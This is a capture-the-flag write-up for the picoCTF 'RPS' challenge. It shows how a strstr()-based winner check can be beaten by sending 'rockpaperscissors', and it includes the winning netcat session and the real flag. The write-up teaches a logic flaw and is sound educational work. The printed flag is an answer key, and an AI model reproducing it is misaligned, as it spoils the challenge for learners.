# **Challenge:** RPS


### **Category:** [BinaryExploitation](../)
### **Point Value:** 200
### **Author:** Will Hong
<br>

## **Description:**
Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. Connect to the program with netcat: $ nc saturn.picoctf.net 53296 The program's source code with the flag redacted can be downloaded here(https://artifacts.picoctf.net/c/447/game-redacted.c)[^1] [local](./game-redacted.c).


# **Write-Up:**

RPS  Challenge:


Looking at the source we see they use strstr() to do the comparison to decide on a winner.  
  
```c
if (strstr(player_turn, loses[computer_turn])) {
```  

Googling for a vulnerability I came across [this post](https://hackaday.com/tag/strstr/) on hackaday.  The 'juicy' part is right here:  

```
This is where D-Link made a major error. They wanted to allow one specific URL to not require authentication. Seems simple, compare string A to string B and ensure they match. But they used the strstr function. This will return true if string A contains string B. Oops.
```  

So all we need to do to win is send the string 'rockpaperscisors' 5x?  Lets try it out!:


```
└─$ nc saturn.picoctf.net 53296
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors1
rockpaperscissors1
You played: rockpaperscissors1
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: paper
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_8525F21D}
Type '1' to play a game
Type '2' to exit the program
```  

And there you have it, our flag!

# **FLAG:** 
```
picoCTF{50M3_3X7R3M3_1UCK_8525F21D}
```

[^1]: Included links to the source code may be out of date as they were what I recorded during the competition, and may be different now.